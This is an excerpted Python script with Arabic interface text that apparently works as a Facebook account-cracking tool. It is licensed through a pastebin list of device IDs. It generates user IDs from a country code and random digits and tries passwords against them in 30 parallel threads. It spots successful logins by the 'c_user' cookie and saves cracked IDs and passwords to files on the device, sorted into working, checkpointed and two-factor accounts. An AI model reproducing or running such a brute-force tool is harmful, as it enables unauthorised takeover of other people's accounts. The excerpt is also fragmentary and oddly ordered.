...
E = "\033[0;90m" #رمادي
# = = = = = = = = = = = =
print(R+ "꧁𝐀𝐋𝐁𝐎𝐑𝐇+𝐌𝐈𝐙𝐃𝐀𝐖𝐈꧂")
pss = input(G+ " ﻲﺒﺣ ﺮﺳ ﻪﻤﻠﻛ ﺐﺘﻛﺍ")

if pss ==yso:
 print(L+ "يﻭﺍﺩﺰﻣ و هﺭﻮﺑ تﺍﺩﺍ ﻲﻓ ﻚﺑ ﺎﺒﺣﺮﻣ")
 time.sleep(2)
 os.system('clear')
else:
 exit(E+ ' Pink Password ')
 import os
...
def subc():
   ...
   id="|".join(uuid)
   ses=requests.get("https://pastebin.com/Xf3UMnCA").text
   if id in ses:
   	pass
   else:
   	print("ﻞﻴﻌﻔﺗ ﺩﻮﻛ "+id)
   	print('يﻭﺍﺩﺰﻣ و هﺭﻮﺑ تﺎﻛﺍﺮﺘﺷﺍ تﺍﺩﺍ')
   	sys.exit()
subc()
print('ﻞﻴﻌﻔﺗ ﻢﺗ')
import os,requests,json,time
import re,random,sys,uuid,string,subprocess,webbrowser
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import time
import sys
import os
...
def heroess():
    ...
    for i in range(50):
        ...
        os.system('clear')
        webbrowser.open('')
        sys.stdout.write(f"\r {random_color}\033[1;91mﻞﻴﻤﺤﺘﻟﺍ يﺭﺎﺟ... " + anim[i % len(anim)] +"\x1b[0m ")
        sys.stdout.write(f"\r {random_color}\033[1;92mﻞﻴﻤﺤﺘﻟﺍ يﺭﺎﺟ" + am[i % len(am)] +"\x1b[0m ")
        sys.stdout.flush()
heroess()
oks = []
user_ID = []
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  𝓐+𝓜   \033[0;m] ')
    print(f"")
    print(f"{YELLOW}[01] {GREEN} تﺍﺩﺍ لﻮﺧﺪﻟ ﻂﻌﺿﺍ🔥")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  𝓐+𝓜 \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42m لﺎﺧﺩﺍ :👇  \033[0;m]")
    print(f"")
    print('ﻚﺑ صﺎﺧ ﻪﻟﻭﺪﻟﺍ دﻮﻛ ﻞﺧﺩﺍ')
    print(f"")
    linex()
    code = input('  لﺎﺧﺩﺍ ')
    os.system("clear")
    ...
    print(f"          \x1b[97m[\033[37;41m   𝓐+𝓜   \033[0;m]")
    print(f"")
    limit =int(input('مﺎﻗﺭﺍ ﻦﻣ ﺪﺣﺍﻭ ﺮﺘﺧﺍ: 𝟏𝟎𝟎𝟎, 𝟐𝟎𝟎𝟎, 𝟓𝟎𝟎𝟎, 𝟏𝟎𝟎𝟎𝟎\n\nلﺎﺧﺩﺍ '))
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {RED}  ﻪﺗﺮﺘﺧﺍ يﺬﻟﺍ ﺺﺤﻔﻟﺍ دﺍﺪﻋ       {RED}"+tl)
        
    
        print(f" {BLUE}  رﺎﺘﺨﻤﻟﺍ ﻪﻟﻭﺪﻟﺍ دﻮﻛ{BLUE}"+code)
        
        
        print(f" {GREEN} ﺮﻀﺘﻧﺍ عﺮﺴﺘﺗ ﻻ ﺺﺤﻔﻟﺍ أﺪﺑ ﺪﻘﻟ")
        print(f'{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
        for love in user:
            uid = code+love
            pwx = [love]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;36m[✅]=========[ 𝐎 𝐊 ]=========[✅]\nﻢﻗﺮﻟﺍ : '+uid+'\nﺰﻣﺮﻟﺍ : '+cid+' √ '+ps+ '\n[✅]=========================[✅]')
                cek_apk(session,coki)
                open('/sdcard/𝓐+𝓜-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                Red = '\033[1;30m'
                print(f'\r{Red}[❎]=========[ 𝐂 𝐏 ]=========[❎]\nﻢﻗﺮﻟﺍ : '+uid+'\nﺰﻣﺮﻟﺍ : '+cid+' √ '+ps+ '\n[❎]==========================[❎]\033[1;97m')
                open('/sdcard/𝓐+𝓜.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/𝓐+𝓜-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;32m[𝓐+𝓜] [%s]\33[1;91m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
